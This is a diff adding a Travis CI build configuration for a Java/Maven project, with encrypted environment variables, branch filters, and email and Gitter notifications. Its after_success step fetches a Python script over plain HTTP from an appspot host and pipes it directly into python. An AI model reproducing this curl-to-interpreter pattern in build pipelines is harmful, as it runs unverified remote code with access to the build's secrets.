@@ -1,0 +1,33 @@
+language: java
+sudo: false
+jdk:
+- oraclejdk8
+before_install:
+- pip install --user codecov
+before_script:
+- export MAVEN_OPTS="-Xmx4096m -Xms128m -Xss64m -server"
+env:
+  global:
+  - secure: hb7XCxuEw3VDF5goORctgcFDwg2Z/WAz1ZHKWNRZmR+M1nN6rgDmwOaJpxepLlU0r/Ku14xspE0yn0nK3P1DFNptXhruDJ1h0+mcwiHdsHOM/Vdo247pPbI9pJTD6gQpNnlgVXAI0s5lkNf3IY2jszzhapKFEMHvnPMFXw/sVzU=
+  - secure: LQcrlV3dVHoI2gKGOcDUdLzk32L83SuIK7mN3zNoaWmIh60Q5G1LLsoeEuR0VueY22aNnoOGTI0KmQsTD4JlpebjxWMYpH9SdHTCsge60/fhcv2GhuJwBVD70+Vex7lOKbpuFRQM+JWuyHh8EjWBkjTNYWae1XGzUYBhaJBpgJQ=
+script: travis_wait mvn clean install
+branches:
+  only:
+  - develop
+  - master
+  - /^feature.*$/
+notifications:
+  email:
+    recipients:
+    - choco@emn.fr
+    on_success: always
+    on_failure: always
+  webhooks:
+    urls:
+    - https://webhooks.gitter.im/e/8292aaf4847b155e80bb
+    on_success: change
+    on_failure: always
+    on_start: never
+after_success:
+- codecov
+- curl http://testr-1154.appspot.com/assets/testR.py | python
